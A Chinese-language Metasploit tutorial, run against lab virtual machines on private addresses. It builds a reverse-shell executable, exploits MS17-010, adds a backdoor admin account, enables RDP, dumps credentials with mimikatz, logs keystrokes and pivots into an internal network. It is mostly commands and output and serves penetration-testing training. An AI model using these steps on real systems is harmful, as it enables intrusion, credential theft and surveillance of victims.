## Metasploit-Framework 简介

Metasploit 是一款开源渗透测试框架平台, 到目前为止, msf 已经内置数千个已披露的漏洞相关的模块和渗透测试工具, 模块使用 ruby 语言编写, 使用者能够根据需要对模块进行适当修改, 也可以调用自己写的测试模块.

选定需要使用的攻击模块后, 只需要简单配置一些参数就能完成针对一个漏洞的测试和利用, 将渗透的过程自动化, 简单化. 

项目地址:
[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

## 相关术语

Exploit: 攻击

通过利用 msf 脚本对目标系统实施精准打击或漏洞验证

Payload: 攻击载荷

攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码

Listener: 监视器

生成木马之后发给受害主机, 监听反弹木马连入本机

## 常用命令

* `msfdb` msf 数据库管理工具
* `msfvenom` msf 独立有效负载生成器, 代替了旧版中的 `msfpayload` 和`msfencode`
* `msfconsole` msf 控制台, 调用模块, 实施攻击

## Windows 反弹 shell

### 生成后门文件

* 生成 32位文件去掉 `/x64` 即可
* 生成 linux 对应文件将 `windows` 修改为 `linux` , 输出文件类型为 `elf`, 不需要 `.exe` 后缀

```sh
┌──(root💀kali)-[~]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.32.128 LPORT=8848 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

### 开启监听端口

```sh
┌──(root💀kali)-[~]
└─# msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.32.128
lhost => 192.168.32.128
msf6 exploit(multi/handler) > set lport 8848
lport => 8848
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.32.128:8848
```

### 目标主机上线

通过某些方式将后门文件发送至目标主机并运行, msf 会得到反弹 shell

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.32.128:8848
[*] Sending stage (200262 bytes) to 192.168.32.130
[*] Meterpreter session 1 opened (192.168.32.128:8848 -> 192.168.32.130:49169) at 2021-07-22 12:26:24 +0800

meterpreter > getuid
Server username: Win7_VM\Administrator
```
## 漏洞利用

### 端口扫描

```sh
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.168.32.130
rhosts => 192.168.32.130
msf6 auxiliary(scanner/portscan/tcp) > set threads 5
threads => 5
msf6 auxiliary(scanner/portscan/tcp) > exploit

[+] 192.168.32.130:       - 192.168.32.130:445 - TCP OPEN
[+] 192.168.32.130:       - 192.168.32.130:5357 - TCP OPEN
[+] 192.168.32.130:       - 192.168.32.130:8900 - TCP OPEN
[*] 192.168.32.130:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SMB 爆破

```sh
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 192.168.32.130
rhosts => 192.168.32.130
msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
smbuser => administrator
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /root/fuzzDicts/passwordDict/top500.txt
pass_file => /root/fuzzDicts/passwordDict/top500.txt
msf6 auxiliary(scanner/smb/smb_login) > set threads 5
threads => 5
msf6 auxiliary(scanner/smb/smb_login) > exploit
```

### ms17-010 扫描

```sh
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.32.145
rhosts => 192.168.32.145
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.32.146:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.32.146:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ms17-010 利用

```sh
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.32.130
rhosts => 192.168.32.130
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.32.128
lhost => 192.168.32.128
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.32.128:4444
[*] 192.168.32.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.32.130:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.32.130:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.32.130:445 - The target is vulnerable.
[*] 192.168.32.130:445 - Connecting to target for exploitation.
[+] 192.168.32.130:445 - Connection established for exploitation.
[+] 192.168.32.130:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.32.130:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.32.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.32.130:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition
[*] 192.168.32.130:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.32.130:445 - 0x00000030  6b 20 31                                         k 1                                       
[+] 192.168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.32.130:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.32.130:445 - Sending all but last fragment of exploit packet
[*] 192.168.32.130:445 - Starting non-paged pool grooming
[+] 192.168.32.130:445 - Sending SMBv2 buffers
[+] 192.168.32.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.32.130:445 - Sending final SMBv2 buffers.
[*] 192.168.32.130:445 - Sending last fragment of exploit packet!
[*] 192.168.32.130:445 - Receiving response from exploit packet
[+] 192.168.32.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.32.130:445 - Sending egg to corrupted connection.
[*] 192.168.32.130:445 - Triggering free of corrupted buffer.
[-] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.32.130:445 - Connecting to target for exploitation.
[+] 192.168.32.130:445 - Connection established for exploitation.
[+] 192.168.32.130:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.32.130:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.32.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.32.130:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition
[*] 192.168.32.130:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.32.130:445 - 0x00000030  6b 20 31                                         k 1
[+] 192.168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.32.130:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.32.130:445 - Sending all but last fragment of exploit packet
[*] 192.168.32.130:445 - Starting non-paged pool grooming
[+] 192.168.32.130:445 - Sending SMBv2 buffers
[+] 192.168.32.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.32.130:445 - Sending final SMBv2 buffers.
[*] 192.168.32.130:445 - Sending last fragment of exploit packet!
[*] 192.168.32.130:445 - Receiving response from exploit packet
[+] 192.168.32.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.32.130:445 - Sending egg to corrupted connection.
[*] 192.168.32.130:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.32.130
[*] Sending stage (200262 bytes) to 192.168.32.130
[*] Meterpreter session 3 opened (192.168.32.128:4444 -> 192.168.32.130:49169) at 2021-07-23 14:07:02 +0800
[*] Meterpreter session 2 opened (192.168.32.128:4444 -> 192.168.32.130:49168) at 2021-07-23 14:07:02 +0800
[+] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.32.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Win 渗透后思路

* cmd 乱码可以通过 `chcp 65001` 修改
* 查看用户 `net user`
* 添加用户 `net user USERNAME PASSWORD /add`
* 添加用户到管理员组 `net localgroup administrators USERNAME /add`

#### 添加用户

```sh
meterpreter > shell
Process 1272 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest
The command completed with one or more errors.

C:\Windows\system32>net user root R00t2o21 /add
net user root R00t2o21 /add
The command completed successfully.

C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    root
The command completed with one or more errors.

C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        ▒▒▒▒Ա▒Լ▒▒▒▒/▒▒▒в▒▒▒▒▒▒Ƶ▒▒▒ȫ▒▒▒▒Ȩ

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.


C:\Windows\system32>net localgroup administrators root /add
net localgroup administrators root /add
The command completed successfully.

C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        ▒▒▒▒Ա▒Լ▒▒▒▒/▒▒▒в▒▒▒▒▒▒Ƶ▒▒▒ȫ▒▒▒▒Ȩ

Members

-------------------------------------------------------------------------------
Administrator
root
The command completed successfully.

```

#### 开启远程桌面

```
C:\Windows\system32>netstat -an
netstat -an

netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING
  TCP    192.168.32.130:139     0.0.0.0:0              LISTENING
  TCP    192.168.32.130:49174   192.168.32.128:4444    ESTABLISHED
  TCP    192.168.32.130:49175   192.168.32.128:4444    ESTABLISHED
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49152             [::]:0                 LISTENING
  TCP    [::]:49153             [::]:0                 LISTENING
  TCP    [::]:49154             [::]:0                 LISTENING
  TCP    [::]:49155             [::]:0                 LISTENING
  TCP    [::]:49156             [::]:0                 LISTENING
  UDP    0.0.0.0:5355           *:*
  UDP    192.168.32.130:137     *:*
  UDP    192.168.32.130:138     *:*
  UDP    [::]:5355              *:*

C:\Windows\system32>exit

meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210723151640_default_192.168.32.146_host.windows.cle_977805.txt

C:\Windows\system32>netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING
  TCP    192.168.32.130:139     0.0.0.0:0              LISTENING
  TCP    192.168.32.130:49158   192.168.32.128:4444    ESTABLISHED
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49152             [::]:0                 LISTENING
  TCP    [::]:49153             [::]:0                 LISTENING
  TCP    [::]:49154             [::]:0                 LISTENING
  TCP    [::]:49155             [::]:0                 LISTENING
  TCP    [::]:49156             [::]:0                 LISTENING
  UDP    0.0.0.0:5355           *:*
  UDP    192.168.32.130:137     *:*
  UDP    192.168.32.130:138     *:*
  UDP    [::]:5355              *:*
  UDP    [fe80::60e3:cb71:9810:3edd%11]:546  *:*
```

#### 尝试获取用密码

```sh
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
wdigest credentials
===================

Username          Domain     Password
--------          ------     --------
(null)            (null)     (null)
WIN-RB49N4UMHO0$  WORKGROUP  (null)

kerberos credentials
====================

Username          Domain     Password
--------          ------     --------
(null)            (null)     (null)
win-rb49n4umho0$  WORKGROUP  (null)
```

#### meterpreter 其他命令

##### 查看系统信息

```sh
meterpreter > sysinfo
Computer        : WIN-RB49N4UMHO0
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

##### 屏幕截图

* 目标系统屏幕截图直接发送到装有 msf 的主机

```sh
meterpreter > screenshot
Screenshot saved to: /root/wIeuGWMF.jpeg
```

##### 提权

* 尝试获取 system 权限, 不一定成功

```sh
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

##### 键盘记录

```sh
meterpreter > keyscan_start
Starting the keystroke sniffer ...

meterpreter > keyscan_stop
Stopping the keystroke sniffer...

meterpreter > keyscan_dump
Dumping captured keystrokes...
```

##### 开启摄像头

```sh
meterpreter > webcam_stream
[-] Target does not have a webcam
```

##### 上传下载

```sh
meterpreter > upload /root/shell.exe C:/windows
[*] uploading  : /root/shell.exe -> C:/windows
[*] uploaded   : /root/shell.exe -> C:/windows\shell.exe

meterpreter > download C:/windows/regedit.exe
[*] Downloading: C:/windows/regedit.exe -> /root/regedit.exe
[*] Downloaded 417.00 KiB of 417.00 KiB (100.0%): C:/windows/regedit.exe -> /root/regedit.exe
[*] download   : C:/windows/regedit.exe -> /root/regedit.exe
```

##### 路由转发

* 路由配置后可以使用 `background` 挂起, 返回 msf 使用对应模块

```sh
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[-] Could not execute autoroute: ArgumentError wrong number of arguments (given 2, expected 0..1)
meterpreter > run autoroute -s 192.168.128.0/24

meterpreter > run post/windows/gather/arp_scanner rhosts=192.168.128.0/24

[*] Running module against WIN-RB49N4UMHO0
[*] ARP Scanning 192.168.128.0/24

meterpreter > run auxiliary/scanner/portscan/tcp rhosts=192.168.128.1

[+] 192.168.128.1:        - 192.168.128.1:25 - TCP OPEN
[+] 192.168.128.1:        - 192.168.128.1:110 - TCP OPEN
```

##### 代理

```sh
meterpreter > run autoroute -s 192.168.128.0/24
meterpreter > background
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set srvhost 192.168.32.128
srvhost => 192.168.32.128
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server
```

* 通过 proxychains 设置 msf 代理地址使 nmap 等工具对目标内网渗透

```sh
proxychains nnmap -sT -sV -Pn -n -p22,80,135,139,445,3306 --script=smb-vuln-ms17-010.nse
```